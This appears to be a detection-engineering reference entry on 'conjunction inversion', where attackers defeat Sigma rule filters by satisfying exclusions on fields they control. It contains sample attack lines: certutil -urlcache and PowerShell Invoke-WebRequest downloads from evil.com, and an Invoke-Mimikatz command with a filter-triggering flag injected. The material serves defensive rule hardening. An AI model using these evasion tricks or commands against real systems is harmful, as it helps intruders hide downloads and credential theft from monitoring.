---
id: ADE4-002
title: "Conjunction Inversion — Exploiting Filters with Attacker-Controllable Fields"
ade_category: ADE4
ade_subcategory: ADE4-02
mitre_attack: N/A (logic flaw, not an attack technique)
platform: Sigma / SIEM (platform-independent)
testable: logic-analysis
---

# Conjunction Inversion

## Summary

When a detection rule's filter condition matches on attacker-controllable fields (file paths, command-line arguments, process names), the attacker can deliberately satisfy the filter to suppress the alert. The rule's exclusion logic becomes a recipe for evasion: the attacker reads the filter, injects the required values, and the rule silences itself.

## ADE Classification

**Category:** ADE4 -- Logic Manipulation
**Subcategory:** ADE4-02 -- Filter Exploitation via Controllable Fields
**Core principle:** Any filter condition that matches on a field the attacker controls is a filter the attacker can trigger at will. The exclusion becomes an instruction manual for evasion.

## The Technique

### The structural problem

Detection rules commonly exclude known-good activity using filters like:

```yaml
filter:
    Image|startswith: 'C:\Program Files\'
```

The intent: "Processes from Program Files are legitimate, don't alert." But the field `Image` is partially attacker-controllable -- an attacker who can write to `C:\Program Files\` (or any subdirectory) can place their binary there and pass the filter.

### Attacker-controllable vs. non-controllable fields

| Field | Attacker-Controllable? | Why |
|-------|----------------------|-----|
| CommandLine | **Yes** | Attacker writes their own command line |
| Image path | **Partially** | Attacker can write to some directories |
| ParentImage | **Partially** | Via PPID spoofing (ADE3-002) |
| User | **Partially** | Depends on compromised identity |
| OriginalFileName | **Mostly no** | Embedded in PE header; changing it changes the hash |
| Hashes (SHA256, IMPHASH) | **No** | Deterministic, cannot be spoofed |
| Digital signature | **No** | Requires private key |
| IntegrityLevel | **Partially** | Depends on privileges obtained |

### The inversion

The attacker reads the rule and "inverts" the filter conjunction -- instead of trying to avoid the detection selection, they satisfy the filter exclusion:

```
Rule logic:  alert IF (selection matches) AND NOT (filter matches)
Attacker:    ensure (filter matches) so alert is suppressed
```

## Logic Analysis

### Example 1: Path-based filter exploitation

**Vulnerable rule intent:** Alert when `certutil.exe` is used to download files, except from Program Files.

```yaml
detection:
    selection:
        Image|endswith: '\certutil.exe'
        CommandLine|contains: '-urlcache'
    filter_programfiles:
        Image|startswith: 'C:\Program Files\'
    condition: selection and not filter_programfiles
```

**Truth table:**

| Image Path | CommandLine | selection? | filter? | Alert? |
|-----------|-------------|-----------|---------|--------|
| `C:\Windows\System32\certutil.exe` | `certutil -urlcache -f http://evil.com` | Yes | No | **Yes** -- caught |
| `C:\Program Files\certutil.exe` | `certutil -urlcache -f http://evil.com` | Yes | Yes | **No** -- filtered |
| `C:\Program Files\malware\certutil.exe` | `certutil -urlcache -f http://evil.com` | Yes | Yes | **No** -- BYPASSED |

The attacker copies `certutil.exe` to a subdirectory under `C:\Program Files\` (writable by many local users if misconfigured, or by any admin). The `|startswith` filter matches, and the alert is suppressed.

### Example 2: Command-line flag injection

**Vulnerable rule intent:** Alert on suspicious PowerShell, except when using RemoteSigned execution policy (assumed legitimate).

```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains:
            - 'Invoke-WebRequest'
            - 'Net.WebClient'
    filter_remotesigned:
        CommandLine|contains: '-ExecutionPolicy remotesigned'
    condition: selection and not filter_remotesigned
```

**Truth table:**

| CommandLine | selection? | filter? | Alert? |
|------------|-----------|---------|--------|
| `powershell Invoke-WebRequest http://evil.com` | Yes | No | **Yes** -- caught |
| `powershell -ExecutionPolicy remotesigned -c "Get-Help"` | No | Yes | No -- not selected |
| `powershell -ExecutionPolicy remotesigned -c "Invoke-WebRequest http://evil.com"` | Yes | Yes | **No** -- BYPASSED |

The attacker simply adds `-ExecutionPolicy remotesigned` to their malicious command. PowerShell accepts the flag, the filter matches, and the alert is suppressed. The flag is purely cosmetic -- it does not restrict the attacker's capabilities in any meaningful way.

### Boolean expansion

```
Original:    selection AND NOT(filter)
Equivalent:  selection AND NOT(CommandLine CONTAINS '-ExecutionPolicy remotesigned')
Attacker:    CommandLine = 'powershell -ExecutionPolicy remotesigned -c "Invoke-Mimikatz"'
Result:      selection=True, filter=True, alert=False
```

The attacker satisfies the filter by injecting a string they fully control.

## Vulnerable Rule

```yaml
title: Suspicious Certutil Download Activity
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\certutil.exe'
        CommandLine|contains:
            - '-urlcache'
            - '/urlcache'
    filter_programfiles:
        Image|startswith:
            - 'C:\Program Files\'
            - 'C:\Program Files (x86)\'
    filter_commandline:
        CommandLine|contains: '-verify'
    condition: selection and not filter_programfiles and not filter_commandline
```

### Why it misses

Two bypass paths:

1. **Path injection:** Copy certutil.exe into `C:\Program Files\SomeDir\` -- the `Image|startswith` filter matches, alert suppressed
2. **Flag injection:** Add `-verify` to the malicious command line (`certutil -urlcache -f -verify http://evil.com/payload`) -- the `-verify` flag triggers the filter, alert suppressed. Certutil may ignore the contradictory flags or process them sequentially.

## Hardened Rule

```yaml
title: Suspicious Certutil Download Activity (Hardened)
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        - Image|endswith: '\certutil.exe'
        - OriginalFileName: 'CertUtil.exe'
    selection_args:
        CommandLine|contains:
            - '-urlcache'
            - '/urlcache'
            - '-URLCache'
    condition: selection and selection_args
# NOTE: No filters on attacker-controllable fields.
# False positive handling via SIEM allowlisting by:
#   - Digital signature of the calling process
#   - Hash of the parent process
#   - Source IP / destination URL allowlists (network-layer)
falsepositives:
    - Legitimate certutil download activity (should be rare and documentable)
level: high
```

### Why the hardened rule works

1. **No filters on controllable fields:** The rule has no exclusions that an attacker can trigger
2. **OriginalFileName as OR:** Catches renamed copies of certutil.exe
3. **False positive management moved to SIEM:** Allowlisting uses non-spoofable fields (signatures, hashes) in the SIEM platform, not in the Sigma rule itself

### Structural fix: Non-spoofable exclusion fields

When filters are necessary, use fields the attacker cannot control:

```yaml
filter_signed:
    ImageSignature: 'Microsoft Windows'
    ImageSignatureStatus: 'Valid'
filter_hash:
    Hashes|contains: 'SHA256=<known-good-hash>'
```

## Research: SigmaFilterCheck Findings

The [SigmaFilterCheck](https://github.com/Karneades/SigmaFilterCheck) tool by Karneades systematically analyzed SigmaHQ rules for filter vulnerabilities:

| Finding | Count | Significance |
|---------|-------|-------------|
| Rules with left-sided wildcard filters (`CommandLine\|contains`) | 25 of 285 | 8.8% of rules filter on attacker-injectable command-line content |
| Process creation rules with vulnerable filters | 16 of 90 | 17.8% of process_creation rules have exploitable exclusions |
| Filters on fully controllable fields (CommandLine, path) | Multiple | Attacker can trigger any of these at will |
| Filters on partially controllable fields (Image path) | Multiple | Exploitable with local write access |

### Categories of vulnerable filters found

1. **CommandLine|contains with known-good strings:** Attacker appends the string
2. **Image|startswith with broad directory prefixes:** Attacker places binary in matching subdirectory
3. **ParentImage exclusions:** Exploitable via PPID spoofing (ADE3-002)
4. **User exclusions:** Incomplete sets (see Gate Inversion, ADE4-001)

## Detection Layers

This is a meta-technique -- it applies to detection rule quality, not to attacker actions directly.

| Audit Method | Catches? | How |
|--------------|----------|-----|
| Field controllability analysis | Yes | Classify each filter field as attacker-controllable or not |
| SigmaFilterCheck tool | Yes | Automated analysis of filter vulnerabilities |
| Adversarial testing | Yes | Attempt to trigger each filter from an attacker's position |
| Filter field audit policy | Yes | Organizational rule: never filter on fully controllable fields |
| Peer review with evasion mindset | Partial | Reviewer asks "can the attacker make this filter match?" |

## Implementation Nuances

- See [Implementation Nuances](../../../bug_patterns/logging_assumption_errors.md) -- filter field controllability is the central concern of ADE4-002
- The fix is not "add more filters" but "filter on different fields" -- move from CommandLine/Image to OriginalFileName/Hash/Signature
- Some SIEM platforms support allowlisting at the platform level (e.g., Splunk risk-based alerting, Elastic exceptions), which keeps the rule itself clean while managing false positives separately
- Even `OriginalFileName` has edge cases: custom-compiled tools won't have a recognizable name, and some legitimate software ships with generic OriginalFileName values
- The principle generalizes beyond Sigma: any detection system (EDR rules, SIEM queries, YARA-L rules) that filters on attacker-controllable fields has the same vulnerability

## References

- [Karneades - SigmaFilterCheck](https://github.com/Karneades/SigmaFilterCheck)
- [SigmaHQ - Rule Repository](https://github.com/SigmaHQ/sigma)
- [Florian Roth - Sigma Rule Quality](https://blog.sigmahq.io/)
